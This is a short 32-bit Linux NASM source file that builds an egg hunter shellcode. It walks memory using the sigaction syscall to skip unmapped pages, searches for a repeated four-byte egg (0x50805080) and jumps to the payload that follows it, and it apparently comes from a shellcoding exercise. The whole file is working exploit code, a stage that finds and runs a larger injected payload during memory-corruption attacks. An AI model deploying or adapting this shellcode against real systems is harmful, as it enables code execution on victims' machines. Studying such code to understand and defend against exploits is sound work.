; Filename: egg_hunter.nasm
; Purpose: creating an egg hunter shellcode


global  _start

section .text



_start:
	cld		; clear direction flag for using with scasd
	xor ecx, ecx	; clear ecx
	xor edx, edx	; clear edx


_align_page:

	or cx, 0xfff	; Setup the page alignment


_next_address:

	inc ecx

;--------------------------------------------------------------
; set eax to 67 sigaction(2)

	push byte +0x43
	pop eax
	int 0x80	; syscall


; check if page is accessable or not

	cmp al,0xf2		; if page is unaccessable EFAULT is return
	jz _align_page		; try again on the next page

	mov eax, 0x50805080	; if accessable store egg in eax

;--------------------------------------------------------------
; to use scasd The string to be searched should be in memory and pointed by the edi

	mov edi, ecx
	scasd			; check if eax = edi, and set new edi to edi+4	
	jnz _next_address	; If eax != edi, try the next address

	scasd			; check if eax = new edi, and increment edi to edi+4	
	jnz _next_address	; If Next 4 bytes didn't match try next address

;--------------------------------------------------------------
; egg found twice jmp to  the address after egg

	jmp edi









